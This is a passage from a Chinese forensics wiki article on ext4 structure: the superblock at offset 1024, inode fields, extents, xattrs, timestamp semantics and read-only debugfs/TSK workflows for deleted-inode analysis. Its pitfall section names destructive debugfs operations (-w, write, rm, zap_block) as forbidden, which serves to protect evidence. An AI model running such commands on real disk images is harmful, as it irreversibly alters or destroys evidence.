---
title: "ext4 结构与 inode"
slug: "filesystem-unix-ext4-inode"
canonical: "https://www.digiforensics.cn/wiki/filesystem-unix-ext4-inode"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:48+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "filesystem"
space: "文件系统分析"
node_path: ["Unix 文件系统"]
---

# ext4 结构与 inode

> 原文链接：[DigiForensics Wiki · 在线阅读](https://www.digiforensics.cn/wiki/filesystem-unix-ext4-inode)

<a id="section-1"></a>

## 一、概述

NTFS 把所有元数据集中在一张定长表（`$MFT`）里，ext 系相反：**元数据分散在成百上千个 inode 和索引节点中**。

这个差异不是风格问题，它直接决定两种取证思维：

- **NTFS 是查一张表**，绝大多数问题在表内解决
- **ext4 是查一棵结构树**，必须沿"超级块 → 块组 → 组描述符 → inode 表 → 索引节点"逐层下钻

走错层的代价是静默的：在错误偏移读到的字节不会报错，只会给出"看起来合理但完全错误"的结构。

这一层在分析环节的文件系统元数据层，与 NTFS 那一组文章平级，**不是它的续篇**。上游是分区定位（`mmls` → 确定 ext4 分区起始扇区），下游三个方向：

- **删除痕迹判读** —— 目录项被删但 inode 完好，这是 ext 系最常见的可恢复形态
- **空间映射与内容提取** —— extent 把逻辑块映射到物理块，这是"拿到 inode 之后怎么把数据取出来"
- **时间戳语义解读** —— ext 的四个时间戳含义与 NTFS 不完全对应，误读会让时间线整体偏移

它是 Linux 取证的入口，后续的日志分析、工件地图、持久化痕迹都建立在"能正确读出 inode 与时间戳"这个能力之上。

落到具体证据上：

- **超级块（偏移 1024，魔术 `0xEF53`）** —— **不在偏移 0**，前 1024 字节留给引导代码。这个偏移是硬指标级别的常见错误，**不能猜**。超级块里有关键参数：块大小、inode 大小、inode 总数、特性标志、状态位、最后挂载时间、journal inode 号
- **`s_state` 状态位** —— `clean` / `clean with errors` / `not clean`。`clean with errors` 意味着已正确卸载但曾有错误，不是脏挂载，两者的处置不同
- `Filesystem features` 特性标志 —— `has_journal`、`extent`、`64bit`、`dir_index`、`ext_attr`。**这是重要参考，但不能单独当作版本判据**：这些是 compat / incompat / ro_compat 能力位，内核文档明确说"内核即使不认识某个标志仍可读写该文件系统"，因此它们描述的是**能力集合**而非格式版本。判定应联合 `s_rev_level`（0x4C）、`s_first_ino`（0x54）与整组 feature 一起看，见 [2.7 联合判定](#section-9)
- **inode 表** —— 每个文件和目录一个 inode，存类型、权限、UID/GID、大小、时间戳、**指向数据的指针**。**inode 本身没有文件名**
- **四个时间戳** —— `atime`、`ctime`、`mtime`、`dtime`。**`dtime` 非 0 通常是删除状态的判据，但它有例外**：未启用 `orphan_file` 特性的 ext4 上，仍被进程打开的孤儿 inode 会把 `i_dtime` **重载为孤儿链表的指针**（内核文档原文：*"If the filesystem does not have orphan_file feature, inodes that are not linked from any directory but are still open (orphan inodes) have the dtime field overloaded for use with the orphan list… dtime is then the number of the next orphaned inode"*），此时非 0 的值是**inode 号而非时间**。NTFS 没有对应字段
- **`links_count`** —— 硬链接计数。`links_count = 0` 与 `dtime != 0` 共同确认为已删除，只看一个会误判
- **extent 映射** —— ext4 默认启用，形如 `logical 0 to 1 phys 131073 to 131074`。**与 ext2/3 的间接块指针是完全不同的机制**，按老经验解读会全部读错
- **`i_block` 间接块** —— ext2/3 的三层间接寻址（直接/一级/二级/三级）。**ext3 及以下没有 extent**，遇到老镜像仍要会
- **xattr 扩展属性** —— 藏在 inode 之外的元数据，`ea_list` 可列。`security.selinux`、`user.*` 都在这里，`ls -l` 看不到
- **`debugfs` 的只读模式** —— 全部操作的入口。**绝不能加 `-w`**，那会写回镜像、破坏原始状态
- **`DigiForensics.dd` 的分区切片** —— 用 `dd` 按起始扇区切出。**超级块在切片的 1024 处**（不是原镜像的 1024）

走完这一层能回答的是这些：这个分区是不是 ext、块与 inode 的关键参数是多少、哪些 inode 处于已删除状态、**已删除 inode 的原始路径还能不能找回来**、以及某个 inode 的数据块在物理上位于哪里。

**回答不了的几件事**：

- **文件名（当目录项已删）** —— ext 系删除通常只删目录项，inode 完好但**名字不可得**。`ncheck` 返回 `<not found>` 是常态，这时只能靠大小、属主、内容语义等间接特征推断身份，且必须在报告里写明"身份为推断"
- **"是谁删的"** —— inode 里没有用户身份，只有 UID/GID。UID 1000 是谁要靠 `/etc/passwd` 反查，而反查依赖镜像里那份 passwd 文件本身可信
- **崩溃前未落盘的操作** —— journal 里有，但那属于日志层（2.5 与 [Steady-State](../filesystem-ntfs/filesystem-ntfs-steady-state-logfile.md) 讨论的同类问题）
- **数据块被覆盖后的内容** —— 簇链断了就取不到，只能走雕刻路线
- **xattr 里的任意值语义** —— 属性名可自定，看到 `user.foo` 只能确认"存在自定义属性"，不能推断含义

往下读之前需要**会读分区表**（知道 `mmls` 输出里每个分区的起始扇区含义）、**理解块与簇的概念**、以及**知道 `debugfs` 默认只读**。

如果完全没接触过 ext 系列，2.1 的版本对照表值得先看——ext2/3/4 三者的差异（有无 journal、有无 extent、inode 大小）会一路影响后面每一层的解读。

另外建议先读一遍 [文件系统取证总览](../filesystem-ntfs/filesystem-ntfs-filesystem-forensics-overview.md) 建立"哪些结构属于元数据"的划分，再进入 inode 层。

超级块到 inode 表的逐层结构推导在[核心原理](#section-2)，`debugfs` 的只读操作链在[操作步骤](#section-10)，完整走一遍见[案例示例](#section-34)，`debugfs` 全部只读命令见[命令速查](#section-44)。

**静默出错是这一层最需要防范的特征**——偏移错一层不会报错，只会给你看起来合理的错误结构。所以[常见陷阱](#section-17)的 4.1 组（偏移与版本误用）值得在动手前先读。

<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 ext2/3/4 的演进与差异

| 特性 | **ext2** | **ext3** | **ext4** |
|---|---|---|---|
| 日志 | ❌ | ✅ | ✅（改进） |
| 目录索引 htree | ❌ | ✅ | ✅ |
| **extent 映射** | ❌ 仅块间接 | ❌ | ✅ **默认启用** |
| 亚秒时间戳 | ❌ | ❌ | ✅ |
| **xattr 扩展属性** | ❌ | ❌ | ✅ |
| inline data | ❌ | ❌ | ✅ |
| 64 位 / 最大容量 | ❌ / 16 TiB | 部分 / 16 TiB | ✅ / **1 EiB** |

> **容量数字的来源（可验算）**：ext2/ext3 用 **32 位块号**，上限是 `2^32` 个块，乘块大小得实际容量——块大小 4 KiB 时为 `2^32 × 4096 = 16 TiB`；块大小 1 KiB 时只有 4 TiB。**"32 TB" 这个常见说法无法由 32 位块号推出**：32 TiB 需要 `2^33` 个块，超出 32 位表示范围。ext4 用 48 位块号，`2^48 × 4096 = 1 EiB`。分析超大镜像时先读 `s_log_block_size` 再算，别直接套用宣传数字。

**取证含义**：有日志 = 元数据改动可回放 = 非正常关机时元数据可能"待回放"；有 extent = 用一串"逻辑块→物理块"映射描述数据，比多层间接块简洁但不直观；有 xattr = 部分元数据（SELinux、ACL、用户自定义数据）不在 inode 主结构里**。

<a id="section-4"></a>

### 2.2 超级块：位于偏移 1024

主超级块位于**文件系统起始 + 1024 字节**（0x400），魔数 `s_magic = 0xEF53`（小端读作 `53 EF`），长度 1024 字节，**所有字段均为小端**。

```
偏移  长度 字段                     偏移  长度 字段
0x00   4   s_inodes_count         0x38   2   s_magic       0xEF53
0x04   4   s_blocks_count_lo      0x3A   2   s_state       1干净/2有错/FFFFFFFF未卸载
0x14   4   s_first_data_block     0x40   4   s_lastcheck   上次 fsck 时间
0x18   4   s_log_block_size       0x4C   4   s_rev_level   0=原始 1=动态 inode
0x20   4   s_blocks_per_group     0x58   2   s_inode_size  128 或 256
0x28   4   s_inodes_per_group     0x5A   2   s_block_group_nr
0x2C   4   s_mtime 最后挂载时间   0xE0   4   s_journal_inum 0=无日志(ext2)
0x30   4   s_wtime 最后写时间     0x108  4   s_mkfs_time   创建时间
```

> **块大小换算**：`块大小 = 1024 << s_log_block_size`。0 → 1024 字节、2 → 4096 字节。**不要假设是 4096**——1024、2048、4096 都合法，旧卷常见 1024。
>
> **超级块备份**：启用 `sparse_super` 时，**块组 1、3、5、7、9、25、27** 各有一份（共 7 份）。**主超级块损坏时仍有备份可读**，这是 ext 系相对 NTFS 的一个取证优势。
```bash
xxd -s 1024 -l 16 /work/DigiForensics-part3.dd    # 期望 53ef（0xEF53，小端）
```

<a id="section-5"></a>

### 2.3 块组与组描述符

ext4 把整个文件系统切分成**等大的块组**，每组包含块位图、inode 位图、inode 表和数据块。

**组描述符表（GDT）** 记录每组的关键位置：`bg_block_bitmap_lo`（块位图块号）、`bg_inode_bitmap_lo`（inode 位图块号）、`bg_inode_table_lo`（inode 表起始块号）、`bg_free_blocks_count_lo` / `bg_free_inodes_count_lo`（空闲计数）。

**块组 0 的特殊性**：超级块和 GDT 占据开头位置，因此**块组 0 的数据区从第 2 块或更靠后开始**——这解释了 ext 的第一个数据块号通常不是 0。

**取证信号**：某块组 inode 位图全满而相邻组大量空闲，可能意味着**目录被大量创建后删除**（inode 耗尽）或 inode 表损坏。

<a id="section-6"></a>

### 2.4 inode：ext 的元数据核心

每个 inode 是定长结构（长度 = `s_inode_size`，ext2/ext3 为 **128 字节**，ext4 通常 **256 字节**）。基础 inode 布局（ext2/ext3/ext4 的前 128 字节完全一致）：

| 偏移 | 长度 | 字段 | 取证意义 |
|---|---|---|---|
| 0x00 | 2 | `i_mode` | **类型 + 权限**（S_IFREG 0x8000 / S_IFDIR 0x4000 / S_IFLNK 0xA000） |
| 0x02 | 2 | `i_uid` | 属主 UID（低 16 位） |
| 0x04 | 4 | `i_size_lo` | 文件大小低 32 位 |
| 0x08 / 0x0C / 0x10 | 4×3 | `i_atime` / `i_ctime` / `i_mtime` | 访问 / 状态变更 / 内容修改（秒） |
| **0x14** | 4 | `i_dtime` | **删除时间（秒，Unix epoch；不参与 64 位扩展）——但存在重载：未启用 `orphan_file` 特性时该字段被用作孤儿 inode 链表，存放"下一个孤儿 inode 号"（0 = 链表末尾），此时非 0 的值不是时间** |
| 0x18 | 2 | `i_gid` | 属组 GID（低 16 位） |
| **0x1A** | 2 | `i_links_count` | **硬链接数（0 = 已删除）** |
| 0x1C | 4 | `i_blocks_lo` | 占用扇区数（**512 字节单位，非文件大小**） |
| 0x20 | 4 | `i_flags` | `0x00080000` extent；`0x10000000` **inline_data** |
| **0x28** | 60 | `i_block[15]` | **传统块指针 / extent 根** |
| 0x68 | 4 | `i_file_acl_lo` | 指向扩展属性（xattr）块 |
| 0x6C | 4 | `i_size_high` | 文件/目录大小的高 32 位（**文件超过 4 GiB 才非零**；ext2/3 中该字段名为 `i_dir_acl`，通常置 0 且不使用） |

**ext4 的 extra inode**（`i_inode_size > 128` 时追加在 0x80 处）：0x80 `i_extra_isize`（附加区长度，常见 0x20）、0x84/0x88/0x8C `i_ctime_extra` / `i_mtime_extra` / `i_atime_extra`（**亚秒精度扩展位**，与秒字段拼接）、0x90/0x94 `i_crtime` / `i_crtime_extra`（**文件"创建时间"**及其扩展位）。

> **`i_crtime` 不是 `ctime`**：ext4 在 `i_ctime` 之外**另加**了真正的"文件创建时间"。传统 Linux 三时间是 atime / mtime / ctime（`ctime` 指 inode 元数据变更，不等于创建）。混为一谈会让时间线错位——**报告中必须分别标注**。
>
> inline_data 位（`i_flags` 的 0x10000000）：文件内容**直接存在 inode 结构内、没有数据块**。这是几十到一百多字节小文件在 ext4 上的常见存储方式。

**符号链接的陷阱**：`i_size` 是**目标路径字符串的长度**（通常几十字节），**不是 0**。目标路径就存在其数据块里。

**误判"符号链接应该是 0 字节"会漏掉极有价值的原始路径信息。**

<a id="section-7"></a>

### 2.5 `i_block`：间接块与 extent

`i_block` 是 15 个 32 位值（60 字节），有两种用法。

（A）传统块间接（ext2/3，或 ext4 未启用 extent 时）：`i_block[0..11]` 是直接指针；`i_block[12]` 一级间接，指向一个"块号数组"块；`i_block[13]` 二级间接；`i_block[14]` 三级间接。问题在于随机访问需多次间接寻址，取证逐层手工下钻非常痛苦。

**（B）Extent 映射（ext4 默认）**：把数据描述成若干条"从第 L 逻辑块开始、连续 N 块、物理上从 P 块开始"的记录。

```
i_block[0..3] 作为 extent header：
  eh_magic = 0xF30A   eh_entries = 条目数
  eh_max = 最大条目数  eh_depth = 0(叶) / >0(索引，需再下钻)

叶节点每条记录（12 字节）：
  ee_block(4) 起始逻辑块 | ee_len(2) 块数
  ee_start_hi(2) 物理块高 16 位 | ee_start_lo(4) 物理块低 32 位

例：逻辑块 0–99 → 物理块 2000–2099
  取逻辑块 50 → 物理块 = 2000 + (50 - 0) = 2050
```

**取证意义**：一次解析即得全部映射，无需多层间接；**`ee_len` 小的记录多 = 碎片严重**，连续大 extent = 碎片少；映射记录了"应占哪些物理块"，**与未分配空间比对可发现被覆盖**。

> **关键提醒**：`eh_depth > 0` 时存在索引 extent 节点，叶节点在下一层，**只读第一层会漏掉大文件的数据位置**。

<a id="section-8"></a>

### 2.6 xattr：藏在 inode 之外的元数据

ext4 的扩展属性存储在 inode 之外的独立块中（`i_file_acl_lo` 指向它）。

**`user.*` 命名空间是隐蔽存储的经典位置**——不出现在 `ls` 输出里，不影响文件大小显示，常被快速取证流程完全忽略。**发现文件大小与预期不符时，必须检查 xattr。**

`security.*` 记录 SELinux 标签与文件能力，`posix_acl_access` 记录访问控制列表（**权限异常值得关注**），`trusted.*` 需 root 才能读。

---
<a id="section-9"></a>

### 2.7 ★ 联合判定：为什么不能只看 feature 标志

`Filesystem features` 那一行经常被当成 ext2/ext3/ext4 的判据，**这是不成立的**。原因是这三个 feature 集合的语义是"内核即使不认识某个标志也仍可读写该文件系统"——它们描述的是**能力**，不是**格式版本**。

Linux 内核文档对三类 feature 的定义：

- `s_feature_compat`（0x5C）：**兼容特性**。内核不认识也能挂载读写。
- `s_feature_incompat`（0x60）：**不兼容特性**。内核不认识就无法挂载。
- `s_feature_ro_compat`（0x64）：**只读兼容特性**。旧内核可只读挂载。

由此推出三条反例，说明单看 feature 会判错：

| 反例 | 为什么 feature 判据会错 |
|---|---|
| ext3 也可以当 ext2 挂 | `has_journal` 是 compat 位，关掉 journal 的 ext3 与 ext2 在这一位上无法区分 |
| extent 可被单独启用 | `extent` 是 ro_compat 位，`tune2fs -O` 可以在非 ext4 布局上打开它；所以"有 extent ⇒ ext4"不成立 |
| `s_rev_level` 本身也只区分 rev | 取值只有 **0（原格式）与 1（动态 inode 大小）** 两个，**不能区分 ext2/3/4** |

**正确的判定顺序**（证据强度从强到弱）：

| 判据 | 位置 | 能说明什么 |
|---|---|---|
| `s_rev_level` | 0x4C | 是否使用动态 inode 大小（rev ≥ 1） |
| `s_first_ino` | 0x54 | **首个非保留 inode 号**：ext4 布局通常为 11，ext2 风格为 12；`tune2fs -O` 转换时该字段会变，是最接近"格式版本"的单一字段 |
| `s_inode_size` | 0x58 | inode 结构大小（ext2 固定 128，启用目录索引后为 256，ext4 可更大） |
| feature 三组 | 0x5C / 0x60 / 0x64 | **能力集合**：能挂什么特性、能否只读兼容挂载 |
| `Journal inode` | 0xE0 | 是否启用 journal（**0 只说明未启用，不能断定是 ext2**） |

> **取证纪律**：报告里写"这是 ext4"时，应列出**联合判定的具体字段取值**，而不是只写一行 feature 列表。写"`has_journal` + `extent` + `64bit`，故为 ext4"属于把默认配置当格式定义——一个关掉 journal 又启用了 extent 的 ext3 会被误判。

<a id="section-10"></a>

## 三、操作步骤

<a id="section-11"></a>

### 3.1 第 1 步：定位 ext 分区并确认超级块

```bash
mmls /work/DigiForensics.dd                      # 假设 ext4 分区 Slot 05，起始扇区 1181696
dd if=/work/DigiForensics.dd of=/work/DigiForensics-part3.dd bs=512 skip=1181696 status=none
xxd -s 1024 -l 16 /work/DigiForensics-part3.dd    # 期望 53ef —— 关键：偏移是 1024，不是 0
fsstat -o 1181696 /work/DigiForensics.dd          # TSK 侧确认（不必切卷）
```

<a id="section-12"></a>

### 3.2 第 2 步：用 `debugfs` 读取超级块

`debugfs` 是 e2fsprogs 自带的 ext2/3/4 离线检查工具，**默认只读、不写盘**：

```bash
debugfs -R "stats" /work/DigiForensics-part3.dd
printf 'stats\
show_super_stats\
' > /tmp/df.cmds && debugfs -f /tmp/df.cmds /work/DigiForensics-part3.dd
```

| 输出字段 | 意义 |
|---|---|
| `Filesystem volume name` | 卷标（与委托方描述是否一致） |
| `Filesystem features` | 特性集（`has_journal` 通常见于 ext3/4；`extent` + `64bit` 通常见于 ext4——但**这是常见默认配置，不是格式定义**，见 [2.7 联合判定](#section-9)） |
| `Block size` | 常见 1024 / 4096，**必须实测** |
| `Inode size` / `Inode count` / `Free inodes` | inode 结构与用量 |
| `Filesystem state` | `clean` / `clean with errors` / `not cleanly unmounted` |
| `Last mount time` / `Filesystem created` | **最近挂载时间** / 创建时间 |
| `Journal inode` | 日志 inode 号（0 = 无日志，**只能说明该文件系统未启用 journal，不能据此断定是 ext2**——ext3/ext4 也可以关闭 journal） |

> ⚠️ **绝对不要**使用 `debugfs -w`，也不要执行 `write` / `rm` / `zap_block` 这类写命令——**会直接改写镜像**，且不经过任何确认提示。

<a id="section-13"></a>

### 3.3 第 3 步：遍历已删除 inode

```bash
debugfs -R "lsdel" /work/DigiForensics-part3.dd
# Inode  UID  GID  Mode     Size Blocks Blocksize  Atime      Ctime      Mtime      Dtime
# 524288 1000 1000 0100644  8192 16     4096      1712810400 1712810400 1712810500 1712810650
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd    # 确认类型
debugfs -R "cat <524288>"  /work/DigiForensics-part3.dd    # 打印符号链接目标字符串
```

| `lsdel` 字段 | 判定 |
|---|---|
| **Dtime** | **删除时间**，非 0 即已删除；这是核心时间点 |
| **Mode** | `0100644` 普通文件 / `0040755` 目录 / `0120777` 符号链接 |
| **Size** | 符号链接是路径字符串长度，**不是 0** |
| **File 列** | 恒为空——**`lsdel` 不含路径信息** |

> **`<inode>` 的来源**：`lsdel` 只给 inode 号，**不含路径**。用 `ncheck <inode>` 反查路径——但已删除 inode 通常返回 `<not found>`（目录项已删），此时路径需靠其他证据重建。**这是 ext 系删除痕迹分析的核心难点。**

<a id="section-14"></a>

### 3.4 第 4 步：读取活跃 inode 与目录树

```bash
fls -o 1181696 -r -p /work/DigiForensics.dd > /evidence/fls-ext.txt   # 目录树
istat -o 1181696 /work/DigiForensics.dd 524288                       # 单个 inode
```

`istat` 输出中 `Created` / `Modified` / `Accessed` 是 ext 常见的**三个**时间（`ctime` 常不单列）；出现 `... nano second resolution` 行 = ext4 亚秒级时间戳。

它的取证价值在于：秒级无法区分"同一秒内的多次操作"，亚秒级可以。对**批量创建文件**的场景（脚本、拖拽、恶意软件复制自身），它能给出**操作先后顺序的强证据**。

<a id="section-15"></a>

### 3.5 第 5 步：检查日志状态

| `debugfs stats` 输出 | 磁盘上的 `s_state` | 含义与取证处置 |
|---|---|---|
| `clean` | `0x0001` | 正常卸载，元数据可信 |
| `clean with errors` | `0x0002` | 曾检测到错误，**须在报告中记录**；元数据仍可信 |
| `not cleanly unmounted` | `0xFFFFFFFF` | **被强制卸载、日志有未回放事务**，元数据可能不完整，结论须标注"可能存在未回放改动" |

> **取证与操作系统的目标恰好相反**：操作系统挂载时**想回放日志来修复文件系统**，取证**要保持日志未回放以保留原始状态**。这是"绝不挂载"原则的根本原因之一（必须挂载时用 `-o noload`，见 [03 只读挂载与安全接入](../../imaging/imaging-mount-simulate/imaging-mount-simulate-read-only-mounting.md)）。

<a id="section-16"></a>

### 3.6 第 6 步：extent 映射与数据提取

```bash
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd   # EXTENTS 行 = 块映射，FLAGS 行判 inline_data
icat -o 1181696 /work/DigiForensics.dd 524288 > /tmp/extracted.bin
stat -c '%s' /tmp/extracted.bin      # 验证：必须等于 inode 的 i_size
file /tmp/extracted.bin && sha256sum /tmp/extracted.bin
```

**inline_data 必须单独判**：`i_flags` 含 `0x10000000` 时内容在 inode 内、没有数据块，`EXTENTS` 行会显示"逻辑块 0→物理块 0"之类的占位映射，看起来很像正常映射，极易误判（`FLAGS: inline_data` 即是此标志）。

---
<a id="section-17"></a>

## 四、常见陷阱

本章按「定位与结构读取 → inode 与时间戳语义 → 空间映射与内容恢复 → 结论表述」归组，每条给出：现象、为什么会误判、误判代价、正确做法。
★ 标记表示该操作会导致原始检材永久灭失或不可逆改变，执行前必须停下来确认。

<a id="section-18"></a>

### 4.1 定位与结构读取

<a id="section-19"></a>

#### 陷阱 1：在偏移 0 读超级块，判"这不是 ext 文件系统"

**现象**：从分区起始偏移读 16 字节，没看到 `53 EF`，于是判定"该分区不是 ext 文件系统"，转而去分析别的分区。

**原因**：ext 系列把超级块放在文件系统起始 + 1024 字节（`0x400`）处，前 1024 字节留给引导代码（这是一章列出的第二个痛点，也是"硬指标级别的常见错误"）。

而**引导区的开头确实也常常能读到别的引导签名**——它看起来"有结构"，于是"读到了引导代码"这个现象被读成"这个分区有自己的引导，不该是 ext"，而真正的错误是偏移用错了。

**影响**：**整个 ext4 分区被排除在分析范围之外**。这是一个方向性错误：ext 系元数据分散在成百上千个 inode 里，主观排除一整个文件系统，损失远大于解析难度。案例第 1 步的 `xxd -s 1024` 就是这个动作本身。

**核查**：**先定位，再校验魔数**：

```bash
mmls /work/DigiForensics.dd                      # 拿分区起始扇区，不要猜
dd if=/work/DigiForensics.dd of=/work/DigiForensics-part3.dd bs=512 skip=1181696 status=none

# 关键：偏移 1024（0x400），不是 0
xxd -s 1024 -l 16 /work/DigiForensics-part3.dd
# 00000000: 53ef 0100 ...   ← 53 ef = 0xEF53（小端），命中

fsstat -o 1181696 /work/DigiForensics.dd          # TSK 侧独立确认，不必切卷
```

**主超级块损坏时不要立刻放弃**——启用 `sparse_super` 时，块组 1、3、5、7、9、25、27 各有一份备份（共 7 份）。**读不到主超级块时应当逐个试备份块组**，这是 ext 系相对 NTFS 的一个取证优势：

```bash
# 备份超级块位置 = 第 N 块组的第一个块
#   块号 = 块组号 × s_blocks_per_group
#   字节偏移 = 块号 × 块大小 + s_first_data_block × 块大小
# 已知 4 KiB 块、8192 块/组（1 KiB 块时的典型值）时，块组 1 的首个块号是 8192，
# 对应字节偏移 8192 × 4096 = 33554432（32 MiB）——**块号不是字节偏移，两者差一个块大小**
xxd -s 33554432 -l 16 /work/DigiForensics-part3.dd
```

> **块组 1 的首块号取决于 `s_blocks_per_group`，而它随块大小变化**：1 KiB 块时约为 8192，4 KiB 块时典型为 32768。上面 33554432 是"块号 8192 × 4 KiB 块"这一组合的结果；**换块大小必须重算**，不能沿用上一次的偏移。

<a id="section-20"></a>

#### 陷阱 2：假设块大小是 4096

**现象**：按 4096 字节块计算块号、换算物理偏移，得到的文件提取出来是错乱内容，换一个偏移却"看起来对了"，于是按后者写进报告。

**原因**：块大小 = 1024 << `s_log_block_size`（2.2 的换算式），1024、2048、4096 都合法，旧卷常见 1024。2.2 已经明确写了"不要假设是 4096"。

而**用错块大小时，解析并不会立刻失败**——它会产出一个偏移了固定倍数的位置，读出的是**另一个合法但无关的块**。这类错误最麻烦的地方在于：它总能找到一个"看起来能读"的调整方案，从而绕过检查。

**影响**：**提取出的是错误位置的内容**。案例里数据块是 `logical 0 to 1 phys 131073 to 131074`，**换算成偏移依赖块大小**——用错块大小，131073 号块会落在完全不同的位置。而"提取到了一堆看起来有意义的字节"这个结果，比提取失败危险得多。

**核查**：**块大小必须实测，写进工作记录**：

```bash
debugfs -R "stats" /work/DigiForensics-part3.dd | grep -E 'Block size|Inode size'
# Block size: 4096   Inode size: 256
```

```bash
# 或直接读 s_log_block_size（超级块内 0x18 处，4 字节小端）
xxd -s $((1024 + 0x18)) -l 4 /work/DigiForensics-part3.dd
# 00000000: 0200 0000  → 2 → 1024 << 2 = 4096
```

**提取后的第一道检查就是长度校验**（3.6 已列）：

```bash
stat -c '%s' /tmp/extracted.bin      # 必须等于 inode 的 i_size
# 案例：8192 = 8192 ✓
```

长度不等于 `i_size` 时不要"再调调参数"——先回头核对块大小与块号来源。

<a id="section-21"></a>

#### 陷阱 3：★ 用 `debugfs -w` 或执行写命令

**现象**：为"修复"读不出的 inode 加上 `debugfs -w` 参数，或执行 `write` / `rm` / `zap_block`，镜像随即被改写。

**原因**：`debugfs` 默认只读，这个默认值保护了绝大多数人——而问题恰恰出现在"读取失败时"。

读不出内容最自然的反应是"是不是文件系统有问题，需要修一下"，于是加了 `-w`。3.2 的警示行写得很直白：**会直接改写镜像，且不经过任何确认提示**。`debugfs` 是调试工具，它的语境是"我知道我在做什么"；取证语境不是。

**影响**：**不可逆的检材破坏**。而且这类破坏极难察觉：`debugfs` 不弹确认框，命令返回码正常，`lsdel` 之后文件可能就不在了。

最讽刺的是——被"修复"掉的往往正是最有价值的删除痕迹。

**核查**：**永远不开 `-w`**。需要写入的诉求一律转为"在工作副本上操作并记录"：

```bash
# 正确：只读模式
debugfs -R "lsdel" /work/DigiForensics-part3.dd
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd
debugfs -R "dump <524288> /tmp/recovered-hist" /work/DigiForensics-part3.dd

# 禁止：debugfs -w /work/DigiForensics-part3.dd
# 禁止：任何 write / rm / zap_block / sif 命令
```

主副本与工作副本分离，并在工作记录里固定主副本哈希——这是所有可写操作的通用前置条件（见 [只读挂载与安全接入](../../imaging/imaging-mount-simulate/imaging-mount-simulate-read-only-mounting.md)）。

<a id="section-22"></a>

#### 陷阱 4：为了"修复文件系统"而挂载回放日志

**现象**：把分区复制出来直接 `mount`，让日志回放修好元数据，再做分析，报告写"已恢复的文件系统结构如下"。

**原因**：ext3/ext4 挂载时**会想回放 journal 来修复文件系统**（3.5 的关键说明：操作系统的目标是修复，取证的目标是保持原始状态）。而**挂载后目录树看起来是"正常"的**，这恰恰是最强的误导——一个被回放修复过的文件系统会给出一个自洽、完整、看起来完全正常的目录树。**你无法从结果上看出它被动过。**

**影响**：**"曾存在未完成的事务"这个信息被消除了**。而这正是 ext4 日志的唯一取证价值所在：它记录了"崩溃前正在做什么"。回放之后，这个信息不复存在——**不是被覆盖，而是被"完成"了。**

**核查**：**离线优先，必须挂载时禁用回放**：

```bash
# 首选：完全离线，全部走 debugfs / TSK
debugfs -R "lsdel" /work/DigiForensics-part3.dd
fls -o 1181696 -r -p /work/DigiForensics.dd > /evidence/fls-ext.txt

# 必须挂载时：-o noload 禁止 journal 回放，且只挂工作副本
sudo mount -o ro,noload,noatime /work/DigiForensics-part3.dd /mnt/ext
sudo umount /mnt/ext
```

**日志状态必须在分析前确认并记录**（3.5 的三档判定）：

| `debugfs stats` | `s_state` | 结论强度 |
|---|---|---|
| `clean` | `0x0001` | 元数据可信，直接用 |
| `clean with errors` | `0x0002` | 元数据仍可信，**但"曾有错误"必须写进报告** |
| `not cleanly unmounted` | `0xFFFFFFFF` | 元数据可能不完整，所有结论须标注"可能存在未回放改动" |

案例的状态是 `clean with errors`——结论要点里"该状态本身已记录"这句不是形式，它决定了后续每一个元数据结论的证据等级。

<a id="section-23"></a>

### 4.2 inode 与时间戳语义

<a id="section-24"></a>

#### 陷阱 5：把 `i_crtime` 当成 `ctime`

**现象**：把 inode 里的创建时间直接标为"ctime"，与 NTFS 语境下的 `$STANDARD_INFORMATION` 创建时间对照，发现对不上，判定"时间被篡改"。

**原因**：ext4 在 `i_ctime` 之外另加了 `i_crtime`（extra inode 的 `0x90`），它才是真正的"文件创建时间"（2.4 的提醒）。而 `i_ctime` 的语义是 **inode 元数据变更时间**——权限改了、属主改了、链接数变了，它都会更新，**文件内容可能一行没动**。Linux 传统三时间是 atime / mtime / ctime，**ctime 从来不等于创建时间**，这个混淆在 ext4 出现 `i_crtime` 之前就已经存在，ext4 只是让它更容易被误用。

**影响**：**时间线整体错位**。`i_crtime` 早于 `i_ctime` 是常态（创建后发生过元数据变更），而如果把 `i_ctime` 当创建时间，就会得到"创建时间晚于某次元数据变更"的矛盾，于是反向推断"时间被篡改"——**为一个正常现象造出一个篡改结论**。这种错误在报告里的影响较大，因为它是指控性的。

**核查**：**四个时间分别标注，互不合并**：

```bash
debugfs -R "stat <524288>" /work/DigiForensics-part3.dd
# 输出中分别对应：ctime（状态变更）/ mtime（内容修改）/ atime（访问）
#             crtime（创建时间，仅 ext4）

istat -o 1181696 /work/DigiForensics.dd 524288 | grep -E 'Created|Modified|Accessed'
# 出现 "... nano second resolution" 行 → ext4 亚秒时间戳
```

| 字段 | 语义 | 什么会更新它 |
|---|---|---|
| `i_crtime` | 文件创建（ext4 专有，`0x90`） | 创建时写入，之后不变 |
| `i_ctime` | inode 元数据变更 | 权限、属主、链接数、扩展属性变更 |
| `i_mtime` | 文件内容修改 | 数据写入 |
| `i_atime` | 最后访问 | 读取（受 `relatime`/`noatime` 影响） |

**亚秒时间戳的独立价值**：秒级无法区分"同一秒内的多次操作"，亚秒级可以——对批量创建文件（脚本、拖拽、恶意软件复制自身），它能给出操作先后顺序的强证据（3.4）。

<a id="section-25"></a>

#### 陷阱 6：用 `i_size` 和 `i_blocks` 推断"文件大小"

**现象**：对符号链接 inode 判读时，发现 `i_size` 非 0（如 41 字节），判为"结构异常"；或者 inode 显示 `Blocks = 16`，遇到 `i_size` 与按扇区推算值不符的 inode，判为"inode 损坏"。

**原因**：这两个字段的语义都被想当然地套成了"文件大小"：

- 符号链接的 `i_size` 是目标路径字符串的长度，不是 0（2.4 的原话，3.3 的字段表也重复了一遍）。**目标路径就存在它的数据块里**——它指向的是一段路径，而那段路径需要字节来存。
- `i_blocks_lo` 的单位是 512 字节扇区，不是字节，也不是块（2.4 字段表的明确标注），而且**它不是文件大小的可靠换算结果**：稀疏文件、块尾未用空间、间接块本身都要计入。一个 1 GB 的稀疏文件可能只占极少扇区。

